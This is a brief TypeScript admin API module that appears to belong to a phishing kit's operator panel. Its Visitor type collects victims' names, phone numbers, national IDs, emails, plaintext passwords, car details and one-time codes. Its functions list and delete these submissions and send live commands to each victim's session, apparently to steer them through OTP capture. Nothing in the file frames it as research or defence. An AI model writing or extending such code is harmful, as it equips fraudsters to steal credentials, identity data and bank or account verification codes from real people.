const BASE = "/api/wiqaya";

export interface Visitor {
  id: string; submittedAt: string; submittedAtTs: number;
  name: string; phone: string; nationalId: string;
  email: string; password: string;
  carPlate: string; carYear: string; carMake: string;
  otpCode: string; otpStatus: string | null;
  page: string; isActive: boolean; lastSeen: number; country: string;
}

export const adminApi = {
  async getAll(): Promise<Visitor[]> {
    const r = await fetch(`${BASE}/submissions`);
    return r.json();
  },
  async sendCmd(id: string, cmd: string) {
    await fetch(`${BASE}/cmd/${id}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cmd }) });
  },
  async deleteOne(id: string) {
    await fetch(`${BASE}/submissions/${id}`, { method: "DELETE" });
  },
  async deleteAll() {
    await fetch(`${BASE}/submissions`, { method: "DELETE" });
  },
};
